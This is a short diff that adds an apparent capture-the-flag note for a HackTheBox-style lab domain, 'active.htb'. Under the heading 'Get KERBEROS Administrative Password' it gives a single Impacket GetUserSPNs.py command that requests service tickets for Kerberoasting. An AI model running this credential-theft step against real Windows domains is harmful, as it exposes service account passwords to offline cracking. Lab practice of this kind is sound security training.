@@ -1,0 +1,5 @@
+
+Get KERBEROS Administrative Password
+=====================================
+
+GetUserSPNs.py -request -dc-ip X.X.X.X active.htb/svc_tgs
